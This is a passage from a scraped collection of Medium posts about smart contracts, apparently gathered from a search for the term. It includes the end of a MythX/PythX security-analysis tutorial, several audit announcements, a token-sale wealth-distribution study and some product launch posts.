                  \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 queueTime      \u2502 1488                                 \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 runTime        \u2502 11572                                \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 status         \u2502 In Progress                          \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 submittedAt    \u2502 2019-04-20T09:22:56.522Z             \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502 submittedBy    \u2502 5c6d656206d17300110e24d6             \u2502\u2558\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255bOnce your job is done, you will see the following entry in the status object:\"status\":\"Finished\"Retrieving ResultsOnce the job is in \u201cfinished\u201d state we can retrieve the results with the pythx report command.$ pythx report d257381b-97b0\u20134fce-9832\u20137da2f8ca2ebbThis sends an authenticated request to the /analysis/UUID/report endpoint:GET https://api.mythx.io/v1/analyses/d257381b-97b0\u20134fce-9832\u20137da2f8ca2ebb/issues HTTP/1.1 200Authorization: Bearer [Access token]A list of detected security issues is returned in the response.HTTP/1.1 200Content-Type: application/json; charset=utf-8[  {    \"issues\": [      {        \"swcID\": \"SWC-101\",        \"swcTitle\": \"Integer Overflow and Underflow\",        \"description\": {          \"head\": \"The binary subtraction can underflow.\",          \"tail\": \"The operands of the subtraction operation are not sufficiently constrained. The subtraction could therefore result in an integer underflow. Prevent the underflow by checking inputs or ensure sure that the underflow is caught by an assertion.\"        },        \"severity\": \"High\",        \"locations\": [          {            \"sourceMap\": \"296:29:1\"          }        ],        \"extra\": {          \"testCase\": {            \"initialState\": {              \"accounts\": null            },            \"steps\": null          }        }      },      {        \"swcID\": \"SWC-101\",        \"swcTitle\": \"Integer Overflow and Underflow\",        \"description\": {          \"head\": \"The binary subtraction can underflow.\",          \"tail\": \"The operands of the subtraction operation are not sufficiently constrained. The subtraction could therefore result in an integer underflow. Prevent the underflow by checking inputs or ensure sure that the underflow is caught by an assertion.\"        },        \"severity\": \"High\",        \"locations\": [          {            \"sourceMap\": \"337:30:1\"          }        ],        \"extra\": {          \"testCase\": {            \"initialState\": {              \"accounts\": null            },            \"steps\": null          }        }      },      {        \"swcID\": \"SWC-101\",        \"swcTitle\": \"Integer Overflow and Underflow\",        \"description\": {          \"head\": \"The binary addition can overflow.\",          \"tail\": \"The operands of the addition operation are not sufficiently constrained. The addition could therefore result in an integer overflow. Prevent the overflow by checking inputs or ensure sure that the overflow is caught by an assertion.\"        },        \"severity\": \"High\",        \"locations\": [          {            \"sourceMap\": \"373:23:1\"          }        ],        \"extra\": {          \"testCase\": {            \"initialState\": {              \"accounts\": null            },            \"steps\": null          }        }      }    ],    \"sourceType\": \"solidity-file\",    \"sourceFormat\": \"text\",    \"sourceList\": [      \"token.sol\"    ],    \"meta\": {      \"coveredInstructions\": 318,      \"coveredPaths\": 9    }  }]PythX, just like other tools in the MythX ecosystem, resolves the given source locations and maps them to line numbers in the Solidity input files. The result from a CLI call getting the report will be displayed as a prettier table:Client Libraries and\u00a0ToolsThe MythX API is just the first step for us. We aim to build an open-source ecosystem that allows developers of varying skill levels to easily build tools specific to their needs. Security is an integral part of building a sustainable ecosystem. We practice what we preach, so we already came up with a nice little set of tools and libraries that you can get inspiration from.\u00a0:)MythX Plugin for Truffle: https://github.com/ConsenSys/truffle-securityPythX: https://github.com/dmuhs/pythx/Mythos: https://github.com/cleanunicorn/mythosSabre: https://github.com/b-mueller/sabreArmlet: https://github.com/ConsenSys/armletGetting SupportProcessing build artifacts and source mappings correctly can become tricky for complex Soldity projects. On way to make things easier is to re-use code of the existing projects listed above. You can also get in contact with the team and other tool devs on the Discord server.Further linksMythX developer documentationAwesome MythX smart contract security toolsOpenAPI Spec", "responses": "1"}, {"title": "Zeppelin Solutions Finalizes MANA Smart Contract Security\u00a0Audit", "author_name": "Esteban Ordano", "link": "https://medium.com/decentraland/zeppelin-solutions-finalizes-mana-smart-contract-security-audit-ad01da6a6fdd?source=search_post", "post_date": "Jul 24, 2017", "readtime": "", "upvotes": "57", "content": "Zeppelin Solutions Finalizes MANA Smart Contract Security\u00a0AuditWe\u2019re using the highest security standards for our upcoming token\u00a0sale.Esteban OrdanoBlockedUnblockFollowFollowingJul 24, 2017We take the security of our token sale seriously.That\u2019s why we engaged Zeppelin Solutions, the leader in smart contract security audits to look over our code. Over $250 million has been securely raised with their audited smart contracts.You can find the report published on the Zeppelin Solutions blog. We have resolved the audit\u2019s findings in the latest version of our code.Join the CommunityReach out directly by following our Slack or Telegram channels. Subscribe to our newsletter for exclusive content and insider announcements.", "responses": ""}, {"title": "ConsenSys Diligence delivers final audit report on Brickblock smart contract ecosystem", "author_name": "Brickblock.io", "link": "https://blog.brickblock.io/consensys-diligence-delivers-final-audit-report-on-brickblock-smart-contract-ecosystem-c8a521b64d8e?source=search_post", "post_date": "Sep 21, 2018", "readtime": "4 min read", "upvotes": "176", "content": "ConsenSys Diligence delivers final audit report on Brickblock smart contract ecosystemBrickblock.ioBlockedUnblockFollowFollowingSep 21, 2018Today is a big day for us.It\u2019s been a remarkable journey in just a short amount of time. What started as a few people nerding out on blockchain, Ethereum, and decentralization, with the first proof-of-concept in early 2017, has evolved into partnerships with leaders in the blockchain space and a seat at the forefront of regulatory discourse in the European Union.We are extremely proud to announce that our smart contract ecosystem, which we\u2019ve been working on for nearly two years, has been successfully reviewed by our audit partner, ConsenSys Diligence. The final audit report, after reviewing more than 5000 lines of code, concludes that no critical or major issues were identified. All medium and minor issues have already been addressed either through code changes or by explaining why certain trade-offs were necessary.\u201cWe are very pleased that Brickblock has spent so much time focusing on security and implementing recommendations based on our review,\u201d said ConsenSys Diligence co-founder Tom Lindeman. \u201cThe overall system is well constructed and we applaud Brickblock\u2019s commitment to helping make the entire Ethereum ecosystem become more safe and secure.\u201dThe stated goal of the report was to \u201cverify that the smart contract system is secure, resilient, and working according to its specifications.\u201d We are thrilled to have delivered a positive result in all regards.You can check out the full audit report on GitHub.", "responses": "1"}, {"title": "Analyzing token sale data for smart contract protocols", "author_name": "Mosaic", "link": "https://medium.com/mosaic-network-blog/analyzing-token-sale-data-for-smart-contract-protocols-f2e734e4ad44?source=search_post", "post_date": "Oct 30, 2018", "readtime": "11 min read", "upvotes": "304", "content": "Analyzing token sale data for smart contract protocolsEvery week the Mosaic research team will delve into important topics within the cryptoasset space.MosaicBlockedUnblockFollowFollowingOct 30, 2018Lanre Ige & Rik Bhattacharyya from\u00a0MosaicSmart contract platforms often use token sales to bootstrap their software development and early communities, as was the case with Ethereum (raising \u2248 $18.4 million), Tezos (raising \u2248 $232 million), & EOS (raising \u2248 $4.2 billion).The mechanisms of a given token sale can have a long-lasting impact on the socio-economics and governance processes of a given platform. As a matter of fact, the amounts held by token holders once the blockchain has launched can be argued to be a large determinant of its future success. This fact rings most true in platforms where blockchain proposal, validation, and governance processes are controlled (in a tightly-coupled manner) by those who possess the native token. As such, this article will look at the token sales of Ethereum, EOS, & Tezos and analyze the data, especially from an equity perspective.Categorizing Token\u00a0SalesWe are currently in the process of developing a robust schema by which to categorize the 2,000+ token sales that have raised funds since 2014. The below diagram is a snapshot of this categorization as applied to Ethereum, Tezos, & EOS.Figure 1: Token Sale CategorizationThe three token sales of note have been bolded and, whilst this infographic is far from an exhaustive characterization of all token sales, one can use it to better understand the particularities of the EOS, Ether, & Tezos token sales in particular. For example, out of the three, Tezos was the only token sale to accept more than one cryptoasset (both ETH and BTC), compared to the EOS and Ether sales which accepted ETH and BTC respectively. Moreover, one can notice certain similarities between all three sales; they were all uncapped auctions and involved multiple distinct periods within their sales, for example.Protocol token distributionPublic Blockchains can be viewed as global commons or public goods, hence why there has been a great deal of writing over the last year on the topic of blockchain governance. Tezos and EOS\u2019 block proposal and governance processes are designed in such a way that token holders have direct control over the protocol. Moreover, Ethereum will likely eventually transition to a block proposal model controlled by token holders. As such, the distribution of such protocols from their token sale and onwards is of the upmost importance.The below graphs show the Lorenz Curves of the address wealth token distribution of Ethereum, EOS, & Tezos during their token sale, at their genesis block, and then in the present day. A Lorenz curve is a graphical representation of the distribution of income or wealth; the curve shows the proportion of overall income or wealth assumed by the bottom x% of the individuals within (typically) a nation.It is important to note that for Tezos we only observed the ETH contributions to the token sale.Moreover, the below table shows the Gini coefficient for the three protocols. The Gini coefficient is a measure of statistical dispersion generally used to represent the income or wealth distribution of a nation\u2019s residents.Figure 2: Gini coefficients for EOS, Tezos, &\u00a0EthereumEthereumThe red line in the \u2018Lorenz curve for Ethereum\u2019 graph indicates an incomplete data set. Whilst Lorenz curves are useful when there are noticeable differences in inequality, in the case of Ethereum the differences during the three periods are more nuanced. However, one can clearly see from the Lorenz curves that the genesis block was less equal than the contributions made during the Ether presale. This is likely because of the ETHDEV address which received over 11.9 million ETH at genesis, thus making the genesis block\u2019s curve more skewed outwards.Given for the \u2018Lorenz curve of Ethereum\u2019 graph we only have a complete data set for the distribution up-to (around) the 20th percentile of total ETH wealth, we\u2019ll only draw comparisons up to that point. As of October 11, 2018 the top 0.000718% addresses (324 unique addresses) controlled around 50% of the total ETH supply, compared to 1.0907% (97 unique addresses) of total addresses for the Genesis block and 1.889% (around 170 unique addresses) of total contributing addresses for the Ethereum presale.Ethereum, based off this data, appears to be trending towards a more unequal wealth distribution over time.However, there are a number of caveats which must be considered before one argues that Ethereum has become more unequal over time. Firstly, the current Ethereum address-by-address distribution is greatly skewed by the presence of exchange wallets (37 of them which are easily identifiable) with combined holdings of over 6.8 million ETH. These wallet holdings represent ETH \u2018owned\u2019 by each exchange\u2019s users and an argument can be made to not include such wallets in a wealth distributional analysis. Moreover, there are certain ETH-rich smart contracts such as the Wrapped Ether which represent the locked-up holdings of many other unique addresses and further skew the results.EOSFigure 4: Lorenz curves for\u00a0EOSEOS has seen a steady increase in its GINI coefficient (becoming more unequal) from its token sale to present. There are two main reasons for this:The 100 million EOS allocated to Block.one at the Genesis Block from then on skews the distribution of EOS.The nature of EOS\u2019 Delegated Proof of Stake (DPoS) means that wealthy addresses (block producers) benefit from EOS\u2019 inflation. Therefore, ceteris paribus, over time we can expect to see the EOS economy becoming more unequal.Many of the peculiarities of the EOS distribution can be attributed to the mechanics of the token sale. For example, the extremely long length, as well as the periodization of the sale incentivized users to take advantage of arbitrage, induced fear of missing out among (FOMO) speculators, and made it easier for the token issuer to (in theory) wash trade & unethically promote their token.Figure 5: Cumulative ETH raised in EOS token\u00a0saleThe periodization of the EOS token sale made it easier for large addresses to make large purchases throughout the token sale; moreover, it may have incentivized individuals to make multiple purchases of EOS\u200a\u2014\u200ain cases where they otherwise wouldn\u2019t have. The largest single contributor (not including the Yunbi exchange address) sent 19 transactions to the EOS token sale contract; once in periods 235, 280, 281, 283\u2013290, & 300, twice in 282 & 299, and three times in period 298. 6,283 addresses in total contributed more than once which was around 9.65% of the total number of contributing addresses.A contributor stands to gain from spreading their ETH evenly throughout as many periods as possible of the EOS token sale. The amount of EOS one received for a given amount of ETH is determined by the total demand for EOS within the given period, with the amount of EOS sent out remains the same (2 million EOS) on a period-by-period basis. Spreading one\u2019s individual demand for EOS over more periods can be argued to increase the likelihood that the average EOS/ETH exchange rate across all relevant periods are more favourable\u200a\u2014\u200aespecially if the individual intends to contribute large amounts of ETH.For a working example, let\u2019s consider address 0x6c8181afaa9c1bb2bccb05f37f0087ca696f28bb. Their utilisation of a (sub-optimal version) of the multi-period purchase strategy led to a total contribution of 150,000.1 ETH which, in turn, returned them about 9,789,693.835 EOS for an average EOS/ETH exchange rate (price) of around 0.01532. If the address had simply contributed in period 280 they would\u2019ve purchased at an EOS/ETH rate of around 0.08828 and consequently received 1,699,066.850 EOS (\u200a\u2014\u200a83% less). A single period, uncapped token sale would prevent such a strategy and mean that a single large contributor would be unable to use a similar strategy to maximize the exchange rate they receive. It is unclear what benefit there is in having an enforced length, multi-period token sale\u200a\u2014\u200afrom an equity perspective\u200a\u2014\u200athough it should be obvious that such a token sale model could be ideal for a project simply aiming to raise as much money as possible.Another corollary of Block.one allowing EOS tokens to be tradable from period 1 of the token sale is the potential for arbitrage and (unfortunately) wash trading.Figure 6: Delta in EOS token sale and market\u00a0pricesThe token sale EOS/ETH rate was greater than the median trading EOS/ETH rate on 138 days between July 1, 2017 to June 1, 2018. The median trading EOS/ETH rate was greater than the token sale rate on 212 days during the same period. In a perfectly efficient market we would expect parity between the two rates, instead the average absolute percentage difference was 8% and the median absolute percentage difference was 5%. While there undoubtedly was arbitrageur behaviour throughout the token sale, the inefficiencies (gas fees, difficulties claiming EOS tokens from the crowdsale, etc.) and lack of liquidity in the general EOS/ETH market\u200a\u2014\u200aespecially in the early days of the crowdsale (first month average percentage difference: 18%; first month median percentage: 7%)\u200a\u2014\u200alimited the proliferation of arbitrage.TezosFigure 7: Lorenz curves for\u00a0TezosTezos\u2019 case is interesting, as the Gini coefficient of its genesis block is much higher than that of its current state. There are several explanations for this:Currently, only 66% of the total XTZ supply has been \u2018activated\u2019\u200a\u2014\u200anot yet usable by the contributors who purchased them during the token sale. This means that 34% of the XTZ purchased in the Tezos token sale is not accounted for in the current Lorenz curve and Gini coefficient calculations for Tezos. This could have a negative effect on reported inequality as wealthier XTZ holders are more likely to activate their holdings as soon as possible in order to benefit from baking and staking.The token sale and genesis data sets do not include the token amounts allocated to the Tezos Foundation, DLS, & Tezos\u2019 early contributors. Including the allocations within the Genesis block calculations would likely increase the Gini coefficient substantially.Unlike EOS, Tezos\u2019 \u2018Liquid Proof Of Stake\u2019 could be argued to limit the centralizing effects of a Proof of Stake model. Token holders are able to avoid their wealth being diluted via block production inflation by \u2018delegating\u2019 their block producing (baking in Tezos lingo) rights and thus receiving a share of the inflation rewards received by the block producer to whom they delegated voting. This mechanism can limit the effect of XTZ inflation\u200a\u2014\u200aespecially if the market for delegation services is competitive.Quantifying (and then legislating via) decentralizationOften inequality analysis is used as a wider attempt to quantify decentralization. We are of the belief that such efforts are likely of little use generally; however, the analysis of changes in token distribution over time\u200a\u2014\u200abeginning with their token sales\u200a\u2014\u200acan give an insight into the underlying system\u2019s socio-economics and act as a guiding light for researchers designing the next generation of smart contract protocols. Moreover, for better-or-for-worse regulators seem to be considering inequality and \u2018decentralization\u2019 metrics in their judgements over tokens and token sales. That point alone should lead stakeholders within the cryptoasset industry to tread carefully when designing their systems, from a distributional and equity perspective, to remain in the good books of the SEC, FCA, & others.SEC Finance Director William Hinman\u2019s comments on Ether suggested that over time the cryptoasset seemingly lost its qualities as a security. To the extent that \u201cbased on [his] understanding of the present state of Ether, the Ethereum network and its decentralized structure, current offers and sales of Ether are not securities transactions.\u201d\u00b9 Based on this reading, token sales such as EOS and Tezos which were generally carried out in a similar manner to Ether must be able to demonstrate (according to whatever criteria a regulator may have) that they are on a credible road to \u2018decentralization\u2019. In the case of EOS, the mechanics of the token sale, DPoS, & its wealth distribution certainly do the project no favour.MethodologyTo end the article, it is important to comment on a few of the limitations of the analysis done. This article considered how token wealth was distributed across addresses, in a similar way to an economist who would look at how income is distributed across a nation\u2019s residents. However, an individual address is in no way equivalent to an individual user. One individual may own multiple addresses (i.e. it is possible, but unlikely, that the top 97 unique addresses on Ethereum are owned by one or a few individual[s]). Moreover, multiple individuals may share ownership of a single address, either indirectly if the address is run by a centralized third-party (i.e. an exchange) or directly through the use of multi-signature wallets or smart contracts which pool together funds (i.e. Wrapped Ether, Bidding Ring contracts, etc.).Moreover, the analysis done on cryptoasset token sales is different from that done with their current state and their genesis block. The former represents the distribution of the inflows into the token sale from unique addresses, whilst the latter represents the holdings of unique addresses. The two often have a 1-for-1 relationship, but not always.ConclusionsThe most interesting finding from this article is the importance of tracking how wealth distribution for cryptoassets change over time. Such a metric is important for two reasons: (1) it seems to be a metric that legislators and regulators will care for going forward; (2) it allows us to see what effect a given blockchain\u2019s sybil-control mechanism (Proof of ____) has on the socio-economics of the protocol going forward. Both concerns are existential concerns for all public blockchains. Over time we\u2019ll refine the findings of this article and aim to expand this analysis\u2019 scale to a wider set of cryptoassets.End of weekly research\u00a0reportWe hope you have enjoyed reading the Mosaic researchers\u2019 weekly report and stay tuned to the next article. Click here to visit our websiteThis article is intended for informational purposes only. The views expressed herein are not and should not be construed as legal or investment advice or recommendations. Recipients of this article should do their own due diligence, considering their specific financial circumstances, investment objectives, and risk tolerance before investing. The individuals contributing to this article have positions in some or all of the assets discussed. This article is neither an offer, nor the solicitation of an offer, to buy or sell any of the assets mentioned herein._____\u00b9 Preston Byrne goes into this issue further and takes issue with Director William Hinman\u2019s comments.", "responses": ""}, {"title": "Smart Contract Completion: The Testing\u00a0Begins", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/smart-contract-completion-the-testing-begins-fbb5126c74ce?source=search_post", "post_date": "Feb 2, 2018", "readtime": "2 min read", "upvotes": "288", "content": "Smart Contract Completion: The Testing\u00a0BeginsCrowdholdingBlockedUnblockFollowFollowingFeb 2, 2018Some good news from today. While working tirelessly but also thoroughly, we have completed the up-gradable feature, and our locking feature. Keep in mind, this is special because in the future we can evolve policies that support our tokenomics in our application. In the future we will create at task to discuss procedures for the future, where you the community get to approve smart contract additions that will make our economy possible, exactly how organized decentralization should be.In the next days our devs will be testing and polishing (refactoring and optimizing) the smart contract. Our partners at Coinhub.io who have seen recent success in their user base will conduct independent tests of the new smart contract. In addition, we have been looking over offers for smart contract auditing from a number of companies.As a reminder, our sales team are working hard recruiting startups to our app as you see we have been adding business weekly. However, it is crucial for all of you to place feedback to show our application can add value. You can earn both YUP and other tokens on our Dapp by helping them with tasks. You can participate by joining CH. Check out the tasks on our newsfeed here. Together we are the think tank of the future.You can keep up to date with what is happening at Crowdholding by following us at Facebook, or chatting with us on telegram.", "responses": ""}, {"title": "VideoCoin ERC20 Smart Contract Audit\u00a0Report", "author_name": "VideoCoin", "link": "https://medium.com/videocoin/videocoin-erc20-smart-contract-audit-report-925c7fa75c5e?source=search_post", "post_date": "Jul 17, 2018", "readtime": "", "upvotes": "462", "content": "VideoCoin ERC20 Smart Contract Audit\u00a0ReportVideoCoinBlockedUnblockFollowFollowingJul 17, 2018Following standard industry practice, we recently engaged Hosho to perform a security audit on the VideoCoin ERC 20 Compatible Smart Contract.We received our audit report today and we are very excited to announce that our smart contract was passing 100% and no vulnerabilities were found.Summary of the\u00a0AuditHosho also provided a comprehensive test audit report you can download here. You can also find a signed version of the same report here.Full Audit report from Hosho", "responses": ""}, {"title": "Etherparty Launches Consumer-Ready Smart Contract Application, \u2018Rocket\u2019", "author_name": "Etherparty Smart Contracts, Inc.", "link": "https://blog.etherparty.com/etherparty-launches-consumer-ready-smart-contract-application-rocket-88c52b1ea782?source=search_post", "post_date": "Jul 9, 2018", "readtime": "2 min read", "upvotes": "165", "content": "Etherparty Launches Consumer-Ready Smart Contract Application, \u2018Rocket\u2019Rocket\u2019s intuitive interface and guided, user-friendly process is accessible to\u00a0all.Etherparty Smart Contracts, Inc.BlockedUnblockFollowFollowingJul 9, 2018Interested in launching your own cryptocurrency and crowdfunding campaign? Discover how at rocket.etherparty.com. (Credit: Rocket\u00a0image)The Etherparty team is thrilled to announce\u200a\u2014\u200afinally!\u200a\u2014\u200athe launch of Rocket, the user-friendly token crowdsale creator you can use to create and execute a crowdsale on Ethereum or Bitcoin\u2019s blockchain network, enabled through our fantastic partners at Rootstock.Rocket allows you to create and execute smart contracts, the core programming that facilitates crowdfunding with cryptocurrency, all without the need of a development team. The end-to-end solution is currently designed for utility token-based projects and comes complete with the key elements required to execute a successful token crowdsale.\u201cOur goal in building software has always been about making it easy to use and understand,\u201d said CEO of Etherparty, Kevin Hobbs. \u201cThis product, our first of many to come, democratizes the token generation process and allows anyone to create in a safe, secure, and trusted environment\u200a\u2014\u200aShopify for smart contracts.\u201dRocket\u2019s intuitive interface and guided, user-friendly process is tailored to entry-level users especially those relatively new to blockchain technology and the cryptocurrency space. The objective is to reduce, if not eliminate entirely, the high barrier of entry into the blockchain industry and its most exciting applications\u200a\u2014\u200asmart contracts and token crowdsales.If interested in launching your own cryptocurrency and crowdfunding campaign, discover how at rocket.etherparty.com. Sign-up for an account and receive early access to upcoming announcements, future product updates and helpful information for fundraising with cryptocurrency.To celebrate the kick-off of our successful launch, we are offering community members the opportunity to win 15,000 FUEL tokens through our Blastoff With Rocket contest.In addition, the team is already hard at work on designing and building additional support and added services for Rocket, including support for security token-based crowdsales. So stay tuned for more to come and thank you to all of the supporters out there who have been with us throughout this journey.Any feedback or inquiries regarding Etherparty or Rocket, feel free to contact support@etherparty.com.", "responses": ""}, {"title": "Realitio, the crowd-sourced smart contract oracle: Now in real-money trial on\u00a0mainnet", "author_name": "Edmund Edgar", "link": "https://medium.com/@edmundedgar/realitio-the-crowd-sourced-smart-contract-oracle-now-in-a-real-money-trial-on-mainnet-f46bf016759d?source=search_post", "post_date": "Aug 20, 2018", "readtime": "5 min read", "upvotes": "78", "content": "Realitio, the crowd-sourced smart contract oracle: Now in real-money trial on\u00a0mainnetEdmund EdgarBlockedUnblockFollowFollowingAug 20, 2018Last year we announced our smart contract oracle that we dubbed \u201cSnopes Meets Mechanical Turk on a Blockchain\u201d. Today we\u2019re excited to tell you about the mainnet release of this project, now called Realitio.Realitio is a crowd-based oracle which relies on a system of escalating bonds to generate correct answers for both humans and contracts alike. The goal is cheap and fast verification for any natural-language question that has a publicly knowable answer.In March of this year, we received a generous grant from the Ethereum Community Fund. With this support, Realitio has undergone a full smart contract security audit and a dapp redesign, and it\u2019s now ready to use on the main network with real money.The oracle problemSmart contracts often need information from the real world. This input lets the contract know if a condition has been met, triggering the output. This obviously applies to contracts explicitly tied to real-world events, such as a bet on the World Cup. But it also applies to contracts dependent on subjective conditions to determine whether funds should be released, such as \u201cHas this team completed this milestone?\u201dSome people have suggested the oracle problem is impossible to solve without a trusted party, but there are a number of projects working on it. Witnet, for example, is trying to build a distributed network of nodes who act as witnesses for events, while Augur has launched a delicate game-theoretic high-wire act for resolving markets. Meanwhile, we are experimenting with an approach called Subjectivocracy.All these attempts are highly experimental, and most rely on native tokens. They also tend to suffer from low speed, high cost, and low social scalability. Realitio can use these systems to verify answers quickly and cheaply, acting like a layer two for heavy trustless systems. It can also rely on tried-and-tested systems like panels of trusted parties.How it works.Realitio is based on a simple economic game.You ask a question. To encourage other people to answer, you can offer a reward that goes to whomever gives the final answer.Anyone can answer a question by posting a bond. If they think that answer is wrong, anyone can challenge that answer and change it to a different one, but they must double the bond.Challenges can continue as long as someone is willing to double the bond in the hopes of claiming the bond and the reward. Each answer resets the countdown clock, and the result is settled automatically when the countdown expires. The final answer at that time is the winner and claims the bond and the reward.This crowd-sourced economic game is buttressed by an arbitration system. Anyone who wants to challenge the final answer can request arbitration. Realitio acts as the default arbitrator for now, but the arbitrator can be set to any Ethereum contract and may be controlled by anyone, such as a group or a DAO, or any other decision-making process you can code. The arbitrator contract will have a set fee that must be paid to settle the question, but once the winning total is high enough, it will be profitable to fix a wrong answer via arbitration.For a more detailed look at how this process works, please see the documentation.Next stepsThe current contract is fully functional, and there are no backdoors that would allow us to stop it, delete it or upgrade it. However, experience with real money may show us that we need to make changes, and we consider it to be in a trial period until October 2nd. If we discover during the trial period that changes are necessary, we may launch a new contract and recommend everyone to switch to this new contract.We have also set aside a portion of our budget to act as a malicious user, putting incorrect answers into the system and backing them with bonds. If you can spot them, you can profitably correct them and claim our bonds.Our arbitration contract is currently set to use a fairly low fee, which effectively caps the value of each question. We plan to gradually raise this fee, increasing the amount of money that gets posted as bonds. Once the system is in normal operation, we expect that arbitration will be very unusual, and that nearly all questions will be settled by the economic game.Meanwhile, we are working on plug-ins to connect to existing trustless coordination systems. This work-in-progress contract uses Augur as its final arbitrator, providing the same security assurances as Augur itself but at a fraction of the cost in the typical case. The same approach should work with Kleros, a dispute resolution system powered by Schelling Games. We are also working on our own \u201csubjectivocratic\u201d system which would allow the economy to route around bad arbitrators.On the traditional trust-based approach, we\u2019re in discussions with a few well-known organizations\u200a\u2014\u200aranging from crypto to law to traditional media\u200a\u2014\u200aabout joining an arbitration panel. This panel would be controlled by a smart contract and settled by majority vote. If your organization is interested in acting as an arbitrator, please get in touch with us in our Discord group.Our dapp is live on the main Ethereum network here. If you prefer to tinker with it on a test network, you can use the Rinkeby version here.And if these problems are interesting to you, please join our Discord community.We also have a bot on Twitter at @RealitioBot tweeting out questions and answers, and our normal Twitter account at @RealitioProject.The ability to just throw any question at a contract and get an answer back will be a powerful new tool in the armory of smart contract developers. Take a look, play around and see what you can build.", "responses": ""}, {"title": "10 ideas for smart contract leveraging companies", "author_name": "Yann Ranchere", "link": "https://medium.com/@tek_fin/10-ideas-for-smart-contract-leveraging-companies-fb42032ec931?source=search_post", "post_date": "Jan 4, 2016", "readtime": "", "upvotes": "14", "content": "10 ideas for smart contract leveraging companiesYann RanchereBlockedUnblockFollowFollowingJan 4, 2016As much as the Bitcoin world is missing a killer app, a new generation of applications will be an important part of the success of smart contracts. This is a first list of rough ideas and I intend to spend time in 2016 refining those as well as thinking through other ones.Decentralized commerce platform (starting with digital content)Decentralized KYC platformDigital voting systemAutomated digital will notary platformSecure software update platform (IoT oriented)Securitization negotiation and execution platformAutomated mutual insurance platformShared assets management platformMultiparty project management systemTrading rules transparent dark poolWhy these ideas? Imv, smart contract based architectures are particularly relevant for:multiparty platforms looking to substantially reduce (down to 0?) third party costshigh value personal data management where trust of a third party is a high barrier to providing digital only servicesStart today with Eris Industries obviously!", "responses": "1"}, {"title": "Livepeer Smart Contract Security Audit #1\u00a0Results", "author_name": "Doug Petkanics", "link": "https://medium.com/livepeer-blog/livepeer-smart-contract-security-audit-1-results-631c4d7d98a4?source=search_post", "post_date": "Mar 14, 2018", "readtime": "3 min read", "upvotes": "56", "content": "Livepeer Smart Contract Security Audit #1\u00a0ResultsDoug PetkanicsBlockedUnblockFollowFollowingMar 14, 2018Prior to launching Livepeer on Ethereum\u2019s MainNet network, we felt it important to conduct significant internal testing across multiple networks, complete a round of internal security audits, and work with an external 3rd party security firm to audit and do a security review of the Livepeer smart contracts. We worked with Trail of Bits (ToB) over the course of a couple weeks, and they recently completed their audit.You can read the full Livepeer audit report by Trail of Bits here.In summary, ToB dug deep into the inner workings of the Livepeer protocol and smart contracts. They covered many different areas using both automated tools, custom written tests, and manual inspection and debugging. The report that they produced included:3 potential low severity issues2 potential informational issues0 medium or high severity issues2 code maintainability recommendations.After discussions and recap, Livepeer has produced a response to each of the reported issues, along with a few short term actions.Read Livepeer\u2019s detailed technical response here.In light of the findings and response, Livepeer is in a better place to move forward with its upcoming network launch, knowing that the project has worked with talented external security researchers in an attempt to exploit the protocol. Zero of the reported issues are blockers for the upcoming alpha, but all are positive recommendations for future iteration. Livepeer will continue to engage external security partners going forward as it deploys significant upgrades to the network and iterates over time. For more details around the goals and execution of the audit process, read on.Trail of\u00a0BitsAfter an extensive outreach and educational process around evaluating different potential security partners, Livepeer was excited to have selected Trail of Bits as its first external audit partner for the following reasons.They were an existing security firm of professionals which predated the recent boom of Ethereum and Solidity smart contract audits.They have a positive recent track record in the Ethereum, EVM, and blockchain world, having recently run audits for MakerDAO, Parity, and RSK.They have built and contributed open source tools to the security research world including Manticore and Echidna.Positive recommendations and reference checks.Significant track record of community engagement including research publications and security conference presentations.Professional and responsible communication, organization, management, and execution. The quote and work were on time and on budget.Audit GoalsToB understood that Livepeer would be rolling out gradually over time and iterating frequently. Since protocol upgrade and parameter 